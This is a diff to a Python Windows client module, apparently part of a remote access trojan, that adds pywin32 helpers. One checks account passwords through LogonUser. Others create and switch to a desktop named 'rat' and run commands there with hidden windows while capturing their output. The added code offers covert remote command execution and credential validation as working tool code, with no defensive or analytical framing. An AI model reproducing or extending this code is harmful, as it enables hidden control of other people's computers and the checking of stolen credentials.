@@ -1,4 +1,5 @@
 import ctypes
+import locale
 import os
 import sys
 from ctypes import wintypes
@@ -13,6 +14,7 @@ import win32profile
 import win32security
 import win32service
 import win32ts
+import winerror
 
 from client.util import wrap_path
 
@@ -305,3 +307,67 @@ def decrypt_file(filename, key, buffer_size=65536):
     output_file.close()
     os.remove(filename)
     os.rename(filename + '.decrypted', filename)
+
+
+def logon_user(username, password):
+    try:
+        token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
+                                        win32security.LOGON32_PROVIDER_DEFAULT)
+        token.Close()
+        return True
+    except win32security.error as e:
+        if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
+            return True
+        if e.winerror == winerror.ERROR_LOGON_FAILURE:
+            return False
+        return False
+
+
+def create_desktop():
+    h_desktop = win32service.CreateDesktop('rat', 0, win32con.MAXIMUM_ALLOWED, None)
+    h_desktop.SwitchDesktop()
+    h_desktop.SetThreadDesktop()
+
+
+def switch_default():
+    h_desktop_default = win32service.OpenDesktop('default', 0, False,
+                                                 win32con.READ_CONTROL | win32con.DESKTOP_SWITCHDESKTOP)
+    h_desktop_default.SwitchDesktop()
+
+
+def create_pipe():
+    import win32pipe
+    security_attributes = win32security.SECURITY_ATTRIBUTES()
+    security_attributes.bInheritHandle = True
+    stdout_r, stdout_w = win32pipe.CreatePipe(security_attributes, 0)
+    stderr_r, stderr_w = win32pipe.CreatePipe(security_attributes, 0)
+    return stdout_r, stdout_w, stderr_r, stderr_w
+
+
+def create_process(lp_application_name, lp_command_line):
+    import win32file, win32event, win32pipe
+    start_info = win32process.STARTUPINFO()
+    stdout_r, stdout_w, stderr_r, stderr_w = create_pipe()
+    start_info.lpDesktop = 'rat'
+    start_info.dwFlags = win32con.STARTF_USESTDHANDLES | win32con.STARTF_USESHOWWINDOW
+    start_info.wShowWindow = win32con.SW_HIDE
+    start_info.hStdOutput = stdout_w
+    start_info.hStdError = stderr_w
+    proc_info = win32process.CreateProcess(
+        lp_application_name,
+        lp_command_line,
+        None,
+        None,
+        True,
+        win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_NEW_CONSOLE,
+        None,
+        None,
+        start_info
+    )
+    win32event.WaitForSingleObject(proc_info[0], win32event.INFINITE)
+    if win32pipe.PeekNamedPipe(stderr_r, 0)[1]:
+        err = win32file.ReadFile(stderr_r, 1024)
+        return 0, err[1].decode(locale.getdefaultlocale()[1])
+    if win32pipe.PeekNamedPipe(stdout_r, 0)[1]:
+        out = win32file.ReadFile(stdout_r, 1024)
+        return 1, out[1].decode(locale.getdefaultlocale()[1])
